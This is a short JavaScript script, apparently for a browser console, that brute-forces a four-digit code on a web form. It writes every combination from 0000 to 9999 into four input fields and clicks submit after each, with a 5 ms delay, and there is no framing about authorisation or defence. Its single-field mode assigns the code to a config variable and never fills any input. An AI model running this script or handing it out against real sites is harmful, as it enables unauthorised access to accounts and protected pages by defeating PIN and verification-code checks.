let configs = {
    'delayMs': 5,
    'uniqueDigitInput': false,
    'elements': {
        'digitInputs': {
            'first': document.getElementsByTagName('input')[15],
            'second': document.getElementsByTagName('input')[16],
            'third': document.getElementsByTagName('input')[17],
            'fourth': document.getElementsByTagName('input')[18]
        },
        'digitInput': null,
        'submitButton': document.getElementsByClassName('btn btn-submit')[0]
    }
}

const sleep = function(ms) {
    return new Promise(resolve => setTimeout(resolve, ms))
}

const tryAllCombinations = async function(configs) {
    for (let first = 0; first <= 9; first++) {
        for (let second = 0; second <= 9; second++) {
            for (let third = 0; third <= 9; third++) {
                for (let fourth = 0; fourth <= 9; fourth++) {
                    if (!configs.uniqueDigitInput) {
                        // Change values in form 
                        configs.elements.digitInputs.first.value = first.toString()
                        configs.elements.digitInputs.second.value = second.toString()
                        configs.elements.digitInputs.third.value = third.toString()
                        configs.elements.digitInputs.fourth.value = fourth.toString()
                    } else {
                        configs.elements.digitInput = first.toString() + second.toString() + third.toString() + fourth.toString()
                    }
                    
                    // Submit combination 
                    configs.elements.submitButton.click()
                    await sleep(configs.delayMs)
                }
            }
        }
    }
}

tryAllCombinations(configs)
